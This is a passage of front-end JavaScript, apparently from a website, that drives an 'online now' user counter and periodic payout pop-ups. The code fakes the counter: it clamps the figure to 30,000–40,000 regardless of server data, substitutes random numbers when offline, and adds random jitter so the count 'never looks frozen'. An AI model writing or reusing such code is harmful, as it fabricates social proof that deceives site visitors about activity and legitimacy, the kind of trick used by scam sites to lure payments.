      onlineDisplay += diff * 0.18 + (Math.random() - 0.5) * 40;
      onlineDisplay = Math.min(40000, Math.max(30000, onlineDisplay));
      renderOnlineNow();
    }, 400);
  }

  const updateOnline = () => {
    api("/api/heartbeat", { method: "POST", body: "{}" }).then(d => {
      if (d && d.online) animateOnlineTo(d.online);
    }).catch(() => {
      // offline fallback: still wiggle locally
      animateOnlineTo(30000 + Math.floor(Math.random() * 10000));
    });
  };
  updateOnline();
  setInterval(updateOnline, 3500);
  // local micro-wiggle every 1.2s so it never looks frozen
  setInterval(() => {
    if (!onlineAnimTimer) {
      const wiggle = onlineTarget + (Math.random() - 0.5) * 180;
      animateOnlineTo(wiggle);
    }
  }, 1200);
  setInterval(showPayouts, 12000);
  setTimeout(showPayouts, 2500);
}

boot();
